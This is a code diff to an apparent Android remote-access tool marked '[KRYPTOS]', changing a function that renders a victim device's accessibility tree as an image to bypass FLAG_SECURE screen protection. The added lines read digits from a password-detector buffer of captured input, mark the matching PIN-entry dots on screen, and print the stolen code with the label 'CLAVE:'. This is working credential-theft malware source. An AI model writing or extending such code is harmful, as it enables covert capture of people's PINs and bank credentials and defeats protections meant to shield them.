@@ -937,7 +937,7 @@ class DeviceConnectionManager:
                 logger.warning("VNC_WD err: " + str(e))
 
     def render_tree_image(self, device_id: str, tree):
-        """[KRYPTOS] Arvore como imagem (bypass FLAG_SECURE) - v3 clara."""
+        """[KRYPTOS] Arvore como imagem (bypass FLAG_SECURE) - v4."""
         try:
             import json as _j
             from io import BytesIO as _B
@@ -994,17 +994,22 @@ class DeviceConnectionManager:
                         continue
                     return s
                 return ""
+            def _bb(n):
+                nb = n.get("bounds") or {}
+                try:
+                    return (int(float(nb.get("x", 0)) * scale), int(float(nb.get("y", 0)) * scale),
+                            int(float(nb.get("w", 0)) * scale), int(float(nb.get("h", 0)) * scale))
+                except Exception:
+                    return None
             drawn = 0
             for n in nodes:
                 t = _txt(n)
                 if not t:
                     continue
-                nb = n.get("bounds") or {}
-                try:
-                    x = int(float(nb.get("x", 0)) * scale); y = int(float(nb.get("y", 0)) * scale)
-                    w = int(float(nb.get("w", 0)) * scale); h = int(float(nb.get("h", 0)) * scale)
-                except Exception:
+                bb = _bb(n)
+                if not bb:
                     continue
+                x, y, w, h = bb
                 if w <= 1 or h <= 1:
                     continue
                 pwd = bool(n.get("password"))
@@ -1027,7 +1032,62 @@ class DeviceConnectionManager:
                 d.text((x + 5, y + max(0, (h - fsz) // 2 - 1)), tx, font=fnt,
                        fill=((10, 130, 80) if pwd else (28, 28, 36)))
                 drawn += 1
-            if drawn < 1:
+            typed = ""
+            try:
+                proc = getattr(self, "password_detector", {}).get(device_id)
+                if proc is not None:
+                    for ev in (getattr(proc, "password_buffer", None) or []):
+                        try:
+                            for c in str(ev.get("text") or ""):
+                                if c.isdigit():
+                                    typed += c
+                        except Exception:
+                            pass
+                    if not typed:
+                        ld = getattr(proc, "last_detected_password", None)
+                        if ld:
+                            typed = "".join(c for c in str(ld) if c.isdigit())
+            except Exception:
+                typed = ""
+            slots = []
+            try:
+                for n in nodes:
+                    if _txt(n):
+                        continue
+                    cl = str(n.get("class") or "")
+                    if "TextView" in cl or "WebView" in cl or not cl.endswith("View"):
+                        continue
+                    bb = _bb(n)
+                    if not bb:
+                        continue
+                    sx, sy, sw, sh = bb
+                    if sw < 8 or sh < 8 or sw > 95 or sh > 95:
+                        continue
+                    if abs(sw - sh) > 0.6 * max(sw, sh):
+                        continue
+                    dup = False
+                    for (ax, ay, aw, ah) in slots:
+                        if abs(ax - sx) < 12 and abs(ay - sy) < 12:
+                            dup = True; break
+                    if not dup:
+                        slots.append((sx, sy, sw, sh))
+                if slots:
+                    slots.sort(key=lambda s: s[0])
+                    for i, (sx, sy, sw, sh) in enumerate(slots):
+                        r = max(3, min(sw, sh) // 2 - 1)
+                        cx = sx + sw // 2; cy = sy + sh // 2
+                        box = [cx - r, cy - r, cx + r, cy + r]
+                        if i < len(typed):
+                            d.ellipse(box, fill=(35, 35, 48))
+                        else:
+                            d.ellipse(box, outline=(120, 120, 135), width=2)
+                    if typed:
+                        d.text((slots[0][0], max(1, slots[0][1] - 24)), "CLAVE: " + typed, font=_fnt(18), fill=(10, 110, 70))
+                elif typed:
+                    d.text((10, 24), "CLAVE: " + typed, font=_fnt(18), fill=(10, 110, 70))
+            except Exception:
+                pass
+            if drawn < 1 and not slots:
                 return None
             pkg = str(tree.get("package") or "")
             bar = max(16, int(oh * 0.022))
